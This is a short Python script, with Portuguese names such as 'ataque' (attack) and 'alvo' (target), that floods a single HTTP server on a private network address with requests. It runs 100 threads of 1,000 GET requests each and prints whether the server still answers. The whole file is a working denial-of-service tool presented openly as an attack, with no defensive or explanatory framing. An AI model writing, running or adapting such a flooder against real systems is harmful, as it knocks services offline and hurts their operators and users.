import requests
import threading

alvo = "http://192.168.6.27:8000" 
threads = 100
requisicoes_por_thread = 1000

def ataque():
    for _ in range(requisicoes_por_thread):
        try:
            resposta = requests.get(alvo)
            print(f"Status: {resposta.status_code}")
        except:
            print("Servidor não respondeu...")

lista_threads = []

for _ in range(threads):
    t = threading.Thread(target=ataque)
    t.start()
    lista_threads.append(t)

for t in lista_threads:
    t.join()
